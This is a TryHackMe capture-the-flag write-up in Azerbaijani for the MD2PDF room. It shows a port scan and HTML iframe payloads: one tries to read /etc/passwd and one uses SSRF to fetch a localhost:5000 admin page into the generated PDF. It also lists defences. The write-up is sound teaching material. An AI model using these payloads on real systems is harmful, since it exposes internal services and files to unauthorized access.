# TryHackMe — MD2PDF | Writeup (Azərbaycan dilində)

**Platforma:** TryHackMe  
**Otaq:** [MD2PDF](https://tryhackme.com/room/md2pdf)  
**Çətinlik:** Asan  
**Kateqoriya:** Web, SSRF  
**Müəllif:** ramin  

---

## 📋 Ümumi Baxış

Bu CTF çağırışında "TopTierConversions LTD" şirkətinin hazırladığı **MD2PDF** adlı veb alət təqdim olunur. Bu alət Markdown fayllarını PDF-ə çevirir. Açıqlama belə deyir:

> *"This easy-to-use utility converts markdown files to PDF and is totally secure! Right...?"*

`Right...?` — bu sualın özü bir ipucudur. Məqsəd: gizli flagı tapmaq.

---

## 🔍 Kəşfiyyat (Reconnaissance)

### Port Skanı

```bash
nmap -sV -sC -p- 10.82.133.199 --min-rate 5000
```

**Nəticə:**

| Port | Protokol | Xidmət | Qeyd |
|------|----------|--------|------|
| 80   | TCP | HTTP | Əsas veb interfeys |
| 5000 | TCP | HTTP | Flask backend (daxili) |

### Veb İnterfeys

- `http://10.82.133.199` — MD2PDF interfeysi açıldı
- Mətn sahəsi var, **"Convert to PDF"** düyməsi var
- `http://10.82.133.199:5000` — xaricdən əlçatmazdır

---

## 🧠 Zəifliyin Müəyyən Edilməsi

### SSRF (Server-Side Request Forgery)

**İki əsas ipucu var idi:**

1. **İki port açıq idi** — Port 80 (public) + Port 5000 (internal)
2. **PDF çevirici HTML render edir** — `<iframe>`, `<script>` teqlərini işlədir

MD2PDF kimi alətlər adətən **headless browser** (wkhtmltopdf, Chromium) istifadə edir. Bu brauzerlər HTML-i tam render edir — yəni daxili URL-lərə istək göndərə bilir.

**Hücum sxemi:**

```
Hacker → Port 80 (MD2PDF) → localhost:5000/admin → Flag!
```

Server öz-özünə daxili istək göndərir — firewall bunu bloklamır.

---

## 💥 İstismar (Exploitation)

### Addım 1 — `file://` cəhdi (uğursuz)

```html
<iframe src="file:///etc/passwd" width="800" height="600"></iframe>
```

**Nəticə:** `400 Bad Request` — `file://` protokolu bloklanıb.

### Addım 2 — SSRF ilə daxili portları oxumaq

Port 80-dəki MD2PDF mətn sahəsinə daxil edildi:

```html
<iframe src="http://127.0.0.1:5000/admin" width="800" height="600"></iframe>
```

**"Convert to PDF"** düyməsi basıldı.

### Addım 3 — Flag!

PDF faylı açıldı və içində `http://localhost:5000/admin` səhifəsinin məzmunu göründü:

```
THM{XXXXXXXXXXXXXXXXXXX}
```

🚩 **Flag tapıldı!**

---

## 🔬 Texniki İzahat

### Niyə işlədi?

```
Xaricdən:
  Hacker → 10.82.133.199:5000/admin → ❌ BLOCKED

Daxildən (SSRF):
  Hacker → 10.82.133.199:80 (MD2PDF)
              ↓
          Server özü → 127.0.0.1:5000/admin → ✅ ALLOWED
              ↓
          PDF içində cavab göründü → FLAG!
```

### Niyə port 5000 daxildən açıqdır?

Flask development serveri default olaraq `0.0.0.0` əvəzinə `127.0.0.1`-də işləyir — yəni yalnız serverin özündən əlçatandır. Bu admin paneli xaricdən qorumaq üçün edilib, amma SSRF bu qorumanı keçir.

---

## 🛡️ Müdafiə Üsulları

Real dünyada bu zəiflikdən qorunmaq üçün:

1. **URL filterləmə** — `localhost`, `127.0.0.1`, `0.0.0.0` kimi daxili ünvanları bloklamaq
2. **Şəbəkə ayrılığı** — PDF servisi ayrı şəbəkə seqmentinə köçürmək
3. **Headless browser sandbox** — `--no-sandbox` əvəzinə tam sandbox aktivləşdirmək
4. **Allowlist** — yalnız icazəli domenlərdən PDF yaratmaq

---

## 📚 Öyrənilən Konsepsiyalar

| Konsepsiya | Izah |
|-----------|------|
| **SSRF** | Server-i vasitəçi kimi istifadə edib daxili resurslara çatmaq |
| **Port Skanı** | Açıq portları müəyyən etmək |
| **Headless Browser** | HTML render edən serverlərdə HTML injection |
| **Internal Services** | Daxili xidmətlərin xaricdən qorunması və bypass üsulları |

---

## 🏁 Nəticə

Bu CTF SSRF zəifliyinin gözəl bir nümunəsidir. Əsas məntiq belədir:

> Əgər bir server xarici URL-ləri özü fetch edirsə, onu öz daxili şəbəkəsinə istək göndərməyə məcbur edə bilərsiniz.

**Flag:** `THM{...}` ✅

---

*Writeup: TryHackMe MD2PDF otağı üçün hazırlanmışdır.*
